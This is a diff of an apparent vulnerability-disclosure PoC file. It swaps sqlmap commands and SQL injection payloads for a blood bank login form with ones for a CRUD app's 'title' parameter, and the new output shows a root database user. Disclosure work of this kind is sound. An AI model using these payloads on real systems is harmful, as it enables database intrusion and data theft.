@@ -20,47 +20,28 @@
 
 
 # Proof of Concept (PoC) : 
-+ `sqlmap -r request.txt --risk 3 --level 3 --dbms mysql --batch --current-db`
++ `sqlmap -u 'http://localhost/CRUD-Operation/add.php' -p 'title' --data="title=test&descr=test&sub=" --risk=3 --level=3 --method='POST' -D 'crud'`
 
 ```
 ---
-Parameter: hemail (POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-    Payload: hemail=test@test' AND 3778=(SELECT (CASE WHEN (3778=3778) THEN 3778 ELSE (SELECT 9754 UNION SELECT 4153) END))-- -&hpassword=test&hlogin=Login
-
-    Type: error-based
-    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: hemail=test@test' OR (SELECT 3342 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(3342=3342,1))),0x7170767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NSQu&hpassword=test&hlogin=Login
-
+Parameter: title (POST)
     Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: hemail=test@test' AND (SELECT 5639 FROM (SELECT(SLEEP(5)))ulgW)-- QYnb&hpassword=test&hlogin=Login
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 6 columns
-    Payload: hemail=test@test' UNION ALL SELECT CONCAT(0x716a7a6b71,0x567a4f6f4b556976707668696878754f48514d6e63424a706f70714e6f62684f504a7a565178736a,0x7170767a71),NULL,NULL,NULL,NULL,NULL-- -&hpassword=test&hlogin=Login
+    Title: MySQL >= 5.0.12 RLIKE time-based blind
+    Payload: title=test' RLIKE SLEEP(5) AND 'FxIv'='FxIv&descr=test&sub=
 ---
 ```
-+ `sqlmap -u "http://localhost/bloodbank/file/hospitalLogin.php" --method POST --data "hemail=test@test&hpassword=test&hlogin=Login" -p hpassword --risk 3 --level 3 --dbms mysql --batch --current-db`
++ `sqlmap -u 'http://localhost/CRUD-Operation/add.php' -p 'title' --data="title=test&descr=test&sub=" --risk=3 --level=3 --method='POST' -D 'crud' -T 'notes' --is-dba --current-user`
 
 ```
+sqlmap resumed the following injection point(s) from stored session:
 ---
-Parameter: hpassword (POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-    Payload: hemail=test@test&hpassword=test' AND 4940=(SELECT (CASE WHEN (4940=4940) THEN 4940 ELSE (SELECT 5623 UNION SELECT 6789) END))-- -&hlogin=Login
-
-    Type: error-based
-    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: hemail=test@test&hpassword=test' OR (SELECT 8207 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(8207=8207,1))),0x7170767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TrPm&hlogin=Login
-
+Parameter: title (POST)
     Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: hemail=test@test&hpassword=test' AND (SELECT 3303 FROM (SELECT(SLEEP(5)))PdPC)-- lTZZ&hlogin=Login
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 6 columns
-    Payload: hemail=test@test&hpassword=test' UNION ALL SELECT NULL,CONCAT(0x716a7a6b71,0x5271514f636f6f46476f6365424b6e6166454c725751704d6f6c467968626a4e725172785955416d,0x7170767a71),NULL,NULL,NULL,NULL-- -&hlogin=Login
+    Title: MySQL >= 5.0.12 RLIKE time-based blind
+    Payload: title=test' RLIKE SLEEP(5) AND 'FxIv'='FxIv&descr=test&sub=
 ---
+
+root@localhost
+current user: 'root@localhost'
 ```
+![image](https://github.com/esasadam06/Simple-CRUD-Functionality-SQLi-POC/assets/48632551/f1ce31be-d8dd-408b-87c1-a37d6cd76448)
